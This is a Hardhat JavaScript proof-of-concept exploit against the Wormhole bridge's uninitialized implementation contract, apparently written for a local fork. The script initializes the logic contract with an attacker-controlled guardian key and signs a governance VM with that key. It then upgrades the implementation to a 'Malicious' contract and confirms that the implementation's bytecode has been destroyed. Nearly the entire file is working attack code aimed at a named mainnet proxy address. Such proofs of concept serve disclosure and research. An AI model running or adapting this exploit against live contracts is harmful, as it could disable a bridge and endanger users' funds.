const { expect } = require("chai");
const { ethers } = require("hardhat");
const elliptic = require("elliptic");
const { web3 } = require("@openzeppelin/test-helpers/src/setup");

const abiCoder = ethers.utils.defaultAbiCoder; // ABI encoder
const implSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"; // eip1967.proxy.implementation
const wormhomeProxyAddr = "0x98f3c9e6E3fAce36bAAd05FE09d375Ef1464288B";

function zeroPadBytes(value, length) {
   while (value.length < 2 * length) {
      value = "0" + value;
   }
   return value;
}

async function getImplementation(proxyAddr) {
   let readStorageVal = await ethers.provider.getStorageAt(proxyAddr, implSlot);
   let getImpleAddr = await ethers.utils.getAddress(ethers.utils.hexlify(ethers.utils.stripZeros(readStorageVal)));
   return getImpleAddr;
}

async function generateRandomWallet() {
   let pKey = new ethers.Wallet.createRandom();
   let privateKey = pKey._signingKey().privateKey.substring(2);
   let pAddress = pKey.address;
   return [pAddress, privateKey, pKey];
}

// https://github.com/certusone/wormhole/blob/745d3db68d2472b092e8480391115f88c82baede/ethereum/test/upgrades/01_tokenbridge_feetoken_support.js#L357
const signAndEncodeVM = async function (
   timestamp,
   nonce,
   emitterChainId,
   emitterAddress,
   sequence,
   data,
   signers,
   guardianSetIndex,
   consistencyLevel
) {
   const body = [
      abiCoder.encode(["uint32"], [timestamp]).substring(2 + (64 - 8)),
      abiCoder.encode(["uint32"], [nonce]).substring(2 + (64 - 8)),
      abiCoder.encode(["uint16"], [emitterChainId]).substring(2 + (64 - 4)),
      abiCoder.encode(["bytes32"], [emitterAddress]).substring(2),
      abiCoder.encode(["uint64"], [sequence]).substring(2 + (64 - 16)),
      abiCoder.encode(["uint8"], [consistencyLevel]).substring(2 + (64 - 2)),
      data.substr(2),
   ];

   const hash = web3.utils.soliditySha3(web3.utils.soliditySha3("0x" + body.join("")));
   let signatures = "";

   for (let i in signers) {
      const ec = new elliptic.ec("secp256k1");
      const key = ec.keyFromPrivate(signers[i]);
      const signature = key.sign(hash.substr(2), { canonical: true });

      const packSig = [
         web3.eth.abi.encodeParameter("uint8", i).substring(2 + (64 - 2)),
         zeroPadBytes(signature.r.toString(16), 32),
         zeroPadBytes(signature.s.toString(16), 32),
         web3.eth.abi.encodeParameter("uint8", signature.recoveryParam).substr(2 + (64 - 2)),
      ];

      signatures += packSig.join("");
   }

   const vm = [
      web3.eth.abi.encodeParameter("uint8", 1).substring(2 + (64 - 2)),
      web3.eth.abi.encodeParameter("uint32", guardianSetIndex).substring(2 + (64 - 8)),
      web3.eth.abi.encodeParameter("uint8", signers.length).substring(2 + (64 - 2)),

      signatures,
      body.join(""),
   ].join("");

   return vm;
};

async function exploit() {
   let [deployer] = await ethers.getSigners();

   const WormholeProxy = await ethers.getContractAt("IWormholeImpl", wormhomeProxyAddr);
   let wormholeImplAddr = await getImplementation(wormhomeProxyAddr);
   const WormholeImpl = await ethers.getContractAt("IWormholeImpl", wormholeImplAddr);

   const DestructorFactory = await ethers.getContractFactory("Malicious", deployer);
   const destructor = await DestructorFactory.deploy();

   let [, privateKey, pKey] = await generateRandomWallet();
   const attackerSigner = new ethers.Wallet(pKey, ethers.provider);
   await ethers.provider.send("hardhat_setBalance", [attackerSigner.address, "0x4E1003B28D9280000"]);

   // verify the logic contract is initialized on the proxy.
   await expect(await WormholeProxy.chainId()).to.be.not.equal(await WormholeImpl.chainId());
   // verify the logic contract is not initialized on the logic contract itself.
   await expect(await WormholeImpl.chainId()).to.be.equal(0);

   await expect(ethers.utils.arrayify(await ethers.provider.getCode(WormholeImpl.address))).to.have.lengthOf.above(0);
   console.log(
      "WormholeImpl bytecode before: " + (await ethers.provider.getCode(WormholeImpl.address)).substring(0, 24) + "..."
   );

   console.log("WormholeImpl initializing the contract with attackerSigner guardian.\n");
   await WormholeImpl.initialize([attackerSigner.address], 0, 0, ethers.constants.HashZero);

   let data = "0x00000000000000000000000000000000000000000000000000000000436f726501";
   data += [
      abiCoder.encode(["uint16"], [0]).substring(2 + (64 - 4)),
      abiCoder.encode(["address"], [destructor.address]).substring(2),
   ].join("");

   // prepare a upgradable VM bytes[]
   const vm = await signAndEncodeVM(
      0, //timestamp,
      0, //nonce,
      await WormholeImpl.governanceChainId(), // governance chain id
      await WormholeImpl.governanceContract(), // bytes32 governance contract
      0,
      data,
      [
         privateKey, //this is the private key of the initialGuardians[0], i.e attackerSigner.address
      ],
      await WormholeImpl.getCurrentGuardianSetIndex(),
      2
   );

   console.log("Malicious VM prepared: ", vm);
   console.log("\nUpgrading the WormholeImpl contract with VM");
   await WormholeImpl.submitContractUpgrade("0x" + vm);

   await expect(ethers.utils.arrayify(await ethers.provider.getCode(WormholeImpl.address))).to.have.lengthOf(0);
   console.log("WormholeImpl bytecode after: " + (await ethers.provider.getCode(WormholeImpl.address)));
}

exploit();